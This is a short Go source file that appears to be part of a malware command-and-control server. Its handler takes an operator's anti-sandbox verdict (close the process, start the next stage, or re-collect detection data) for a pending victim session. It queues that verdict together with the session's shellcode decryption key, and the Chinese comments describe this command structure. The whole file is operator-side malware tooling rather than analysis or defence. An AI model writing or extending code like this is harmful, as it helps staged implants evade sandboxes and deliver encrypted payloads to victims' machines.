package ToolBar

import (
	"Server/SessionController"
	"github.com/gin-gonic/gin"
)

type PendingSession struct{}

var antiSandboxResult = map[string][]byte{
	"CloseProcess":     []byte{0},
	"StartNextStage":   []byte{1},
	"ReacquireDetData": []byte{2},
}

// 下发待定会话命令
func (p PendingSession) SetPendingSessionCommand(username string, c *gin.Context) {
	// 命令结构: 判定结果 + ShellCode密钥
	command := string(antiSandboxResult[c.PostForm("command")]) + SessionController.PartPendingSessionInfoMap[c.PostForm("sid")]["shellcodeKey"]
	SessionController.PartPendingSessionInfoMap[c.PostForm("sid")]["command"] = command
	if c.PostForm("command") != "ReacquireDetData" {
		SessionController.PartPendingSessionInfoMap[c.PostForm("sid")]["pending"] = "false"
	}
	c.String(200, "success")
}
